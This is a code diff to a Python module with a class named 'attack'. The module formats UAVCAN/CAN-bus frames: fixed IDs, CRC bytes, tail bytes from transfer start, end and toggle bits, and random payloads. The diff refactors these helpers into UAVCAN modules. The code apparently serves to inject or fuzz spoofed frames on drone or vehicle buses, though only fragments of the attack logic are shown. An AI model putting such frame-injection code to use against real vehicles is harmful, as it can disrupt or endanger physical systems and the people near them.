@@ -1,20 +1,12 @@
+from UAVCAN.AID     import UAVCAN_AID
+from UAVCAN.PAYLOAD import UAVCAN_PAYLOAD
+
+# pip3 install python-can
+import can
+
 class CAN:
     def build(interface, can_id, payload):
         return f'{interface}  {can_id}   [{ len(payload.split(" ")) }]  {payload}'
-
-
-class CAN_ID:
-    def __init__(self):
-        pass
-
-
-class CAN_PAYLOAD:
-    def tail(s, e, t, id):
-        return f' {(s << 7) + (e << 6) + (t << 5) + id:02X}'
-
-    def random():
-        import os
-        return ' '.join([ f'{i:02X}' for i in os.urandom(7) ])
 
 
 class attack:
@@ -33,7 +25,7 @@ class attack:
                     'can0', 
                     10015501, 
                     f'{CRC} {" ".join(payload)}' +
-                    CAN_PAYLOAD.tail(
+                    UAVCAN_PAYLOAD.tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
@@ -46,7 +38,7 @@ class attack:
                     'can0', 
                     10015501, 
                     f'{CRC} {" ".join(payload[ : 5 ])}' +
-                    CAN_PAYLOAD.tail(
+                    UAVCAN_PAYLOAD.tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
@@ -63,7 +55,7 @@ class attack:
                         'can0',
                         10015501,
                         " ".join(payload[ : 7 ]) + 
-                        CAN_PAYLOAD.tail(
+                        UAVCAN_PAYLOAD.tail(
                             transfer_start, 
                             transfer_end, 
                             toggle, 
@@ -80,7 +72,7 @@ class attack:
                 'can0', 
                 10015501, 
                 " ".join(payload) + 
-                CAN_PAYLOAD.tail(
+                UAVCAN_PAYLOAD.tail(
                     transfer_start, 
                     transfer_end, 
                     toggle, 
@@ -121,7 +113,7 @@ class attack:
                 'can0', 
                 10015501, 
                 f'{" ".join(payload)}' + 
-                CAN_PAYLOAD.tail(
+                UAVCAN_PAYLOAD.tail(
                     transfer_start, 
                     transfer_end, 
                     toggle, 
@@ -155,8 +147,8 @@ class attack:
         print(CAN.build(
                 'can0', 
                 10015501, 
-                CAN_PAYLOAD.random() +
-                CAN_PAYLOAD.tail(
+                UAVCAN_PAYLOAD.random() +
+                UAVCAN_PAYLOAD.tail(
                     transfer_start, 
                     transfer_end, 
                     toggle, 
@@ -171,8 +163,8 @@ class attack:
             print(CAN.build(
                     'can0',
                     10015501,
-                    CAN_PAYLOAD.random() + 
-                    CAN_PAYLOAD.tail(
+                    UAVCAN_PAYLOAD.random() + 
+                    UAVCAN_PAYLOAD.tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
